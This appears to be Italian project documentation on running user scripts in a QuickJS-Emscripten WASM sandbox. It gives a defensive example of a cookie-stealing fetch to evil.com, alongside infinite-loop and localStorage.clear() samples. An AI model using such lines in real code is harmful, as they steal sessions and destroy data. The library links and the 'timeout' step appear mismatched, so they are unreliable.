# QuickJS-Emscripten - Sandboxed JavaScript Execution

## Cos'è QuickJS-Emscripten?

[QuickJS-Emscripten](https://github.com/aspect-build/aspect-cli/blob/main/docs/quickjs.md) è un port WebAssembly (WASM) del motore JavaScript **QuickJS**, compilato tramite Emscripten per essere eseguito nel browser.

- **QuickJS**: Un motore JavaScript leggero e completo creato da Fabrice Bellard (lo stesso creatore di FFmpeg e QEMU)
- **Emscripten**: Toolchain che compila codice C/C++ in WebAssembly
- **Risultato**: Un interprete JavaScript che gira *dentro* JavaScript, completamente isolato

## Perché lo usiamo?

In Systemica, gli utenti possono scrivere **script JavaScript custom** per definire comportamenti dinamici dei nodi (es. production rate che varia nel tempo).

### Il Problema della Sicurezza

Eseguire codice JavaScript arbitrario con `eval()` o `new Function()` è **estremamente pericoloso**:

```javascript
// ❌ PERICOLOSO - L'utente potrebbe scrivere:
eval("fetch('https://evil.com/steal?data=' + document.cookie)")
eval("while(true) {}") // Blocca il browser
eval("localStorage.clear()") // Cancella i dati
```

### La Soluzione: Sandbox WASM

QuickJS-Emscripten esegue il codice in un **ambiente completamente isolato**:

```javascript
// ✅ SICURO - Il codice gira in una sandbox
// Non ha accesso a:
// - DOM (document, window)
// - Network (fetch, XMLHttpRequest)
// - Storage (localStorage, cookies)
// - File system
// - Qualsiasi API del browser
```

## Come funziona nel progetto

### 1. Inizializzazione (lazy loading)

```typescript
// src/utils/scriptRunner.ts
import { newQuickJSWASMModule } from 'quickjs-emscripten';

let modulePromise: Promise<QuickJSWASMModule> | null = null;

async function getQuickJS() {
  if (!modulePromise) {
    modulePromise = newQuickJSWASMModule(); // Carica WASM solo quando serve
  }
  return modulePromise;
}
```

### 2. Creazione del contesto sicuro

```typescript
const QuickJS = await getQuickJS();
const runtime = QuickJS.newRuntime(); // runtime isolato + limiti
const vm = runtime.newContext();      // contesto isolato
```

### 3. Esposizione di variabili controllate

Solo le variabili che decidiamo noi sono accessibili allo script:

```typescript
vm.setProp(vm.global, "input", vm.newNumber(context.input));
vm.setProp(vm.global, "resources", vm.newNumber(context.resources));
vm.setProp(vm.global, "capacity", vm.newNumber(context.capacity === -1 ? Infinity : context.capacity));
vm.setProp(vm.global, "tick", vm.newNumber(context.tick));

// Funzioni matematiche (globali, non via Math.*)
vm.setProp(vm.global, "min", vm.newFunction("min", (...args) => ...));
vm.setProp(vm.global, "sin", vm.newFunction("sin", (x) => ...));
vm.setProp(vm.global, "random", vm.newFunction("random", () => ...));

// Costanti
vm.setProp(vm.global, "PI", vm.newNumber(Math.PI));
vm.setProp(vm.global, "E", vm.newNumber(Math.E));

// state e getNode sono esposti come API controllate
```

### 4. Esecuzione con timeout

```typescript
const result = vm.evalCode(userScript);
```

### 5. Cleanup della memoria

QuickJS usa gestione manuale della memoria (come C), quindi dobbiamo rilasciare le risorse:

```typescript
result.value.dispose();
vm.dispose();
```

## Variabili disponibili negli script

| Variabile | Tipo | Descrizione |
|-----------|------|-------------|
| `input` | number | Risorse disponibili da processare (Converter) / risorse correnti (Source) |
| `resources` | number | Risorse correnti del nodo |
| `capacity` | number | Capacità del nodo (`-1` = illimitata, esposta come `Infinity`) |
| `capacityRaw` | number | Capacità raw (`-1` = illimitata) |
| `buffer` | number | (Solo Source) Alias di `resources` |
| `bufferCapacity` | number | (Solo Source) Alias di `capacity` |
| `bufferCapacityRaw` | number | (Solo Source) Alias di `capacityRaw` |
| `totalProduced` / `produced` | number | (Solo Source) Totale prodotto finora |
| `maxProduction` / `maxTotalProduction` | number | (Solo Source) Max produzione totale (`-1` = illimitata, esposta come `Infinity`) |
| `maxProductionRaw` / `maxTotalProductionRaw` | number | (Solo Source) Max produzione raw (`-1` = illimitata) |
| `tick` | number | Tick corrente della simulazione (0, 1, 2, ...) |
| `state` | object | Oggetto persistente tra tick (solo valori numerici) |
| `getNode(id)` | function | Legge `{ resources, capacity }` di un altro nodo |

## Esempi di script

### Production rate crescente
```javascript
// Aumenta di 1 ogni 10 tick
return input + floor(tick / 10);
```

### Oscillazione sinusoidale
```javascript
// Varia tra 5 e 15
return 10 + sin(tick * 0.1) * 5;
```

### Produzione random
```javascript
// Tra 50% e 150% del valore base
return input * (0.5 + random());
```

### Bonus basato sulla produzione totale
```javascript
// Stato persistente (es. contatore)
state.count = (state.count || 0) + 1;
return state.count;
```

## Note sul valore restituito

- Lo script deve restituire un numero.
- Il valore viene clampato a `>= 0` e arrotondato per difetto a intero.
- Gli script sono valutati in modo asincrono e cached; la simulazione usa l’ultimo valore calcolato (Play/Step pre-calcola una volta per evitare un primo tick a “0”).

## Vantaggi di QuickJS-Emscripten

| Aspetto | Beneficio |
|---------|-----------|
| **Sicurezza** | Isolamento totale dal browser |
| **Controllo** | Esponiamo solo le variabili che vogliamo |
| **Timeout** | Prevenzione di loop infiniti |
| **Portabilità** | Funziona su tutti i browser moderni |
| **Compatibilità** | Supporta ES2020 JavaScript |
| **Dimensioni** | ~500KB WASM (caricato on-demand) |

## Configurazione Vite

Per far funzionare QuickJS-Emscripten con Vite, è necessario escluderlo dall'ottimizzazione delle dipendenze:

```typescript
// vite.config.ts
export default defineConfig({
  plugins: [react()],
  optimizeDeps: {
    exclude: ['quickjs-emscripten']  // Necessario per WASM
  }
});
```

## Alternative considerate

| Alternativa | Problema |
|-------------|----------|
| `eval()` | Nessun isolamento, accesso totale al browser |
| `new Function()` | Stesso problema di eval |
| Web Workers | Isolati ma hanno ancora accesso a fetch, IndexedDB |
| iframe sandbox | Complesso, problemi di comunicazione |
| **QuickJS-Emscripten** | ✅ Isolamento totale, controllo completo |

## Risorse

- [QuickJS-Emscripten GitHub](https://github.com/aspect-build/aspect-cli)
- [QuickJS Official](https://bellard.org/quickjs/)
- [WebAssembly MDN](https://developer.mozilla.org/en-US/docs/WebAssembly)
